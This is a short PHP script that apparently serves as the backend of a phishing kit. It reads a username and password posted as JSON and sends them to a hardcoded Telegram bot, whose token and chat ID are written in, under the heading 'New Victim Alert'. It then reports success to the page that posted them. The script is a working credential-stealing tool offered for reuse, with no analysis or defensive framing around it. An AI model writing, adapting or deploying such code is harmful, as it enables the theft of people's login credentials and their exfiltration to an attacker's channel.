<?php
header("Content-Type: application/json"); // Set JSON Header

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace with your bot token
    $chat_id = "1559369377"; // Replace with your chat ID

    // Get JSON Data
    $json = file_get_contents("php://input");
    $data = json_decode($json, true);

    $username = htmlspecialchars($data['username']);
    $password = htmlspecialchars($data['password']);

    $message = "🔥 New Victim Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message)."&parse_mode=HTML";

    $response = file_get_contents($url);

    echo json_encode(["status" => "success"]);
}
?>
